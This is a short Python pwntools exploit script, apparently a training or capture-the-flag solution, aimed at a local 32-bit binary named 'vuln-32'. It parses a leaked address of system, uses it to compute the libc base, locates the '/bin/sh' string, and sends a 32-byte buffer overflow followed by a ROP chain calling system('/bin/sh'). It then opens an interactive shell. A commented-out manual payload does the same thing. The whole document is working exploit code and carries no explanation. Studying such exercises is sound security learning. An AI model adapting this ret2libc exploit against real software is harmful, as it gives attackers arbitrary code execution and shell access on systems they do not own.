#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil(b'at: ')
system = int(p.recvline(), 16)

libc.address = system - libc.sym['system']
log.success(f'LIBC base: { hex(libc.address) }')

binsh = next(libc.search(b'/bin/sh'))

offset = 32

# payload = flat(
#     b'A' * offset,
#     libc.sym['system'],
#     0x0,
#     binsh
# )

rop = ROP(libc)
rop.raw(b'A' * 32)
rop.system(binsh)

p.sendline(rop.chain())

p.interactive()
